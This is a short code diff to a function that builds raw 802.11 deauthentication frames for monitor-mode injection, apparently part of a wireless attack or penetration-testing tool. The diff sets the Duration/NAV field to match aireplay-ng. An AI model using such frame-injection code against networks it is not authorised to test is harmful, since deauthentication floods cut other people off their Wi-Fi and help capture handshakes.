@@ -193,7 +193,12 @@ def build_deauth(
     #   octet 0: subtype<<4 | type<<2 | version = 0xC0
     #   octet 1: flags = 0x00
     fc = bytes([0xC0, 0x00])
-    duration = bytes([0x00, 0x00])
+    # Duration/NAV: a unicast deauth reserves the medium for the SIFS + ACK the target
+    # returns (0x013A µs = SIFS + a 1 Mbps ACK, matching aireplay-ng); a group-addressed
+    # (broadcast) target is never ACKed → NAV 0. The 8187L does NOT fill this in for raw
+    # monitor-injected frames, so we set it here.
+    nav = 0 if (target_mac[0] & 0x01) else 0x013A
+    duration = struct.pack("<H", nav)
     seq_ctrl = bytes([0x00, 0x00])
     reason_bytes = struct.pack("<H", reason)
 
